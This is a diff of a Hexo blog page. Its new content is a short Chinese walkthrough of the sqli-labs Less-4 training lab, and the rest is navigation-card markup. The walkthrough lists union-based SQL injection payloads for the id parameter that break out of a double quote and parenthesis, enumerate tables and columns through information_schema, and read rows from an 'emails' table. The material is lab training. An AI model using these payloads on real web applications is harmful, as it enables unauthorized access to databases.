+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>由图与03相比单引变成了双引号…<br><img src="https://img-blog.csdnimg.cn/d8068ae6f3bb4a4c89a036a0d67b0a72.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LuU57G9Xw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">判断是否存在注入：?id<span class="operator">=</span><span class="number">1</span>&quot;)and 1=1-- za  </span><br><span class="line"> 判断字段数：?id=1&quot;)<span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span><span class="comment">-- za  </span></span><br><span class="line"> <span class="keyword">union</span> <span class="keyword">select</span>判断显错位    ?id<span class="operator">=</span><span class="number">1</span>&quot;)union select 1,2,3-- zaa  </span><br><span class="line"> 判断表名：?id=15&quot;)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span><span class="comment">-- zaa  </span></span><br><span class="line"> 判断列名：?id<span class="operator">=</span><span class="number">15</span>&quot;)union select 1,column_name,3 from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;emails&#x27;-- zaa  </span><br><span class="line"> 判断数据名：?id=15&quot;)<span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,id,<span class="number">3</span> <span class="keyword">from</span> emails<span class="comment">-- zaa  </span></span><br></pre></td></tr></table></figure></p>
 
                 
             </div>
@@ -735,6 +735,51 @@ SQL 注入（SQL Injection） 是发生在 Web 程序中数据库层的安全漏
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
+                <a href="/2022/02/18/HTML&CSS/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="HTML&amp;CSS">
+                        
+                        <span class="card-title">HTML&amp;CSS</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-18
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            BvxiE
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">
+                        <span class="chip bg-color">知识总结</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2022/02/13/upload-labs%EF%BC%881~3%E5%85%B3%EF%BC%89/">
                     <div class="card-image">
                         
@@ -751,9 +796,9 @@ SQL 注入（SQL Injection） 是发生在 Web 程序中数据库层的安全漏
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-02-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -767,51 +812,6 @@ SQL 注入（SQL Injection） 是发生在 Web 程序中数据库层的安全漏
                     
                     <a href="/tags/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/">
                         <span class="chip bg-color">靶场记录</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2022/02/02/Hexo%E8%AF%95%E5%86%99/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="Hexo试写">
-                        
-                        <span class="card-title">Hexo试写</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-02-02
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            BvxiE
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/">
-                        <span class="chip bg-color">基本配置</span>
                     </a>
                     
                 </div>
